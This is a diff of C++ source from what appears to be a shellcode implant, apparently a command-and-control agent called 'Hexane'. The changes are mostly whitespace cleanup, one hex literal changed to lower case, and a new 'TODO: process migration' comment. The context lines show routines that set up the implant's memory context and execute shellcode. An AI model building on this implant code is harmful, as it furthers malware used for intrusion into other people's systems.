@@ -12,10 +12,10 @@ using namespace Commands;
 namespace Memory {
     namespace Methods {
 
-	    __declspec(naked) UINT_PTR FindStackPointer() {
-		    __asm__ volatile(
-		        "mov %%rsp, %%rax\n"
-	            "ret"
+        __declspec(naked) UINT_PTR FindStackPointer() {
+            __asm__ volatile(
+                "mov %%rsp, %%rax\n"
+                "ret"
             );
         }
 
@@ -52,7 +52,7 @@ namespace Memory {
 
         BOOL ContextInit() {
             // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/
-        	HEXANE;
+            HEXANE;
 
             _hexane instance    = { };
             void *region        = { };
@@ -80,7 +80,7 @@ namespace Memory {
 
             MemCopy(C_DREF(region), &instance, sizeof(_hexane));
             MemSet(&instance, 0, sizeof(_hexane));
-            MemSet(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);
+            MemSet(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xe);
 
             return true;
         }
@@ -125,6 +125,7 @@ namespace Memory {
 
             return true;
         }
+      // TODO: process migration
 
         BOOL ExecuteShellcode(_parser parser) {
             HEXANE;
@@ -155,7 +156,7 @@ namespace Memory {
             MemSet(base, 0, size);
             success = true;
 
-        defer:
+            defer:
             if (base) {
                 ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_FREE);
             }
